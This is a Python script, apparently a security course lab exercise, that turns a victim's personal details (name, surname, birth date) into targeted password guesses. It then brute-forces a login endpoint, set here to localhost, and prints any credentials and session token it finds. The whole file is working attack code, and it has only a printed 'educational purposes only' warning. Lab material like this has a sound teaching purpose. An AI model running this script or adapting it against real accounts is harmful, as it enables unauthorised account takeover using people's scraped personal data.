#!/usr/bin/env python3
"""
Lab 12: Brute-Force Attack with Personal Information
Generates password combinations from victim's personal information
and attempts brute-force attack on a login endpoint
"""

import requests
import itertools
from datetime import datetime
import time

# Target server configuration
TARGET_URL = "http://localhost:8000/login"
TARGET_USERNAME = "admin"  # Or try multiple usernames

# Victim information (attacker would gather this through OSINT, social media, etc.)
VICTIM_INFO = {
    "name": "john",
    "surname": "doe",
    "birth_year": "1990",
    "birth_month": "05",
    "birth_day": "15",
}

def generate_password_combinations(info):
    """
    Generates various password combinations using victim's personal information.
    Common patterns people use when creating passwords.
    """
    passwords = []
    
    name = info["name"].lower()
    surname = info["surname"].lower()
    year = info["birth_year"]
    month = info["birth_month"]
    day = info["birth_day"]
    
    # Basic combinations
    passwords.extend([
        name,
        surname,
        name + surname,
        surname + name,
        name.capitalize() + surname.capitalize(),
        name + year,
        surname + year,
        year + name,
        year + surname,
    ])
    
    # With numbers
    passwords.extend([
        name + "123",
        name + "1234",
        name + "12345",
        surname + "123",
        name + surname + "123",
        name + year,
        surname + year,
        year + name + surname,
        name + surname + year,
    ])
    
    # With dates
    passwords.extend([
        name + day + month,
        surname + day + month,
        day + month + year,
        name + day + month + year,
        surname + day + month + year,
        name + month + year,
        surname + month + year,
    ])
    
    # With special characters
    passwords.extend([
        name + "!",
        name + "@123",
        name + "#" + year,
        name + surname + "!",
        name + surname + "@" + year,
        name + "2024",  # Current year variations
        name + "2023",
    ])
    
    # Common patterns with birth date
    passwords.extend([
        day + month + year,  # DDMMYYYY
        month + day + year,  # MMDDYYYY
        year + month + day,  # YYYYMMDD
        name + day + month,
        surname + day + month,
    ])
    
    # Capitalization variations
    passwords.extend([
        name.capitalize(),
        surname.capitalize(),
        name.capitalize() + surname.capitalize(),
        name.capitalize() + year,
        surname.capitalize() + year,
    ])
    
    # Combined with common words
    common_words = ["password", "admin", "user", "welcome", "12345"]
    for word in common_words:
        passwords.extend([
            name + word,
            word + name,
            name + word + year,
            word + year,
        ])
    
    # Remove duplicates and return
    return list(set(passwords))

def attempt_login(username, password):
    """
    Attempts to login with given credentials.
    Returns True if successful, False otherwise.
    """
    try:
        response = requests.post(
            TARGET_URL,
            data={
                "username": username,
                "password": password
            },
            timeout=5
        )
        
        # Check if login was successful
        if response.status_code == 200:
            result = response.json()
            if result.get("status") == "success":
                return True, result.get("token", "")
        return False, None
        
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return False, None

def brute_force_attack():
    """
    Performs brute-force attack using generated password combinations.
    """
    print("="*60)
    print("Brute-Force Attack with Personal Information")
    print("="*60)
    print(f"Target: {TARGET_URL}")
    print(f"Target Username: {TARGET_USERNAME}")
    print("")
    print("Victim Information:")
    for key, value in VICTIM_INFO.items():
        print(f"  {key}: {value}")
    print("")
    
    # Generate password combinations
    print("Generating password combinations from personal information...")
    passwords = generate_password_combinations(VICTIM_INFO)
    print(f"Generated {len(passwords)} password combinations")
    print("")
    
    # Start brute-force attack
    print("Starting brute-force attack...")
    print("-"*60)
    
    attempts = 0
    start_time = datetime.now()
    
    for password in passwords:
        attempts += 1
        print(f"[{attempts}/{len(passwords)}] Trying: {password}", end=" ... ")
        
        success, token = attempt_login(TARGET_USERNAME, password)
        
        if success:
            end_time = datetime.now()
            duration = (end_time - start_time).total_seconds()
            
            print("✓ SUCCESS!")
            print("")
            print("="*60)
            print("CREDENTIALS FOUND!")
            print("="*60)
            print(f"Username: {TARGET_USERNAME}")
            print(f"Password: {password}")
            print(f"Token: {token}")
            print(f"Attempts: {attempts}")
            print(f"Time taken: {duration:.2f} seconds")
            print("="*60)
            return True
        else:
            print("✗ Failed")
        
        # Small delay to avoid overwhelming the server
        time.sleep(0.1)
    
    end_time = datetime.now()
    duration = (end_time - start_time).total_seconds()
    
    print("")
    print("="*60)
    print("ATTACK COMPLETED")
    print("="*60)
    print(f"Total attempts: {attempts}")
    print(f"Time taken: {duration:.2f} seconds")
    print("No valid credentials found.")
    print("="*60)
    return False

if __name__ == "__main__":
    print("⚠️  WARNING: This is for educational purposes only!")
    print("⚠️  Only use this on systems you own or have explicit permission to test.")
    print("")
    
    brute_force_attack()

